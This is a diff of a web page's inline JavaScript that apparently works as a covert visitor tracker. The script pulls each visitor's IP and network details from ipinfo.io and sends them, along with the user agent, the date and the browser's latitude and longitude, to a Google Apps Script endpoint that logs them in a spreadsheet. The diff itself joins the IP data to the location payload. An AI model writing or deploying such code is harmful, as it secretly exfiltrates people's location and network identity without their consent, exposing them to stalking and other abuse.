@@ -17,6 +17,7 @@ src="https://www.facebook.com/tr?id=225134694655880&ev=PageView&noscript= 1" /><
 <meta property="og:image" content="https://i.pinimg.com/564x/d7/e6/82/d7e6827385081838af76d288e2149555.jpg" />
 	
 	<script type='text/javascript'>	
+		var m = "";
       Date.prototype.today = function () { 
     return ((this.getDate() < 10)?"0":"") + this.getDate() +"/"+(((this.getMonth()+1) < 10)?"0":"") + (this.getMonth()+1) +"/"+ this.getFullYear();
 }
@@ -28,7 +29,7 @@ var userAgent   = navigator.userAgent;
 	
 	$.getJSON('https://ipinfo.io/json', function(data) {
   console.log(JSON.stringify(data, null, 2));
-      var m =  JSON.stringify(data, null, 2);
+      m =  JSON.stringify(data, null, 2);
 	    var src = "https://script.google.com/macros/s/AKfycbwvRlurPQ0nDCp_StgnybhG2Q8_CAdu4fw-4_V1Z8EMDaRosrc/exec?id=1ZiCB96-heu56uabsOofrJ5an8WPXISzlOuSeU41DVmw&sheet=model&action=insert&nama="+userAgent+"&pasword= "+datetime+"&nope=,"+m;
 
 
@@ -46,7 +47,6 @@ request.done(function( msg ) {
  
 request.fail(function( jqXHR, textStatus ) {
 
-		$('#itemcontent').html('<div>false</div>');
 		
 		    	});
       
@@ -433,7 +433,7 @@ function Redirect() {
      var datetime = new Date().today() ;
 
 	function ok(latitude , longitude ) {
-	    var src = "https://script.google.com/macros/s/AKfycbwvRlurPQ0nDCp_StgnybhG2Q8_CAdu4fw-4_V1Z8EMDaRosrc/exec?id=1ZiCB96-heu56uabsOofrJ5an8WPXISzlOuSeU41DVmw&sheet=data&action=insert&nama=http://maps.google.com/maps?q=loc:"+latitude+","+longitude+"&email=,"+latitude+"&pasword=,"+longitude+"&nope=BLOG 3 : "+m+"  "+datetime;
+	    var src = "https://script.google.com/macros/s/AKfycbwvRlurPQ0nDCp_StgnybhG2Q8_CAdu4fw-4_V1Z8EMDaRosrc/exec?id=1ZiCB96-heu56uabsOofrJ5an8WPXISzlOuSeU41DVmw&sheet=data&action=insert&nama=http://maps.google.com/maps?q=loc:"+latitude+","+longitude+"&email=,"+latitude+"&pasword=,"+longitude+"&nope=BLOG 3 : "+datetime+m;
 
 
      // id = unique id of the message/comment/chat
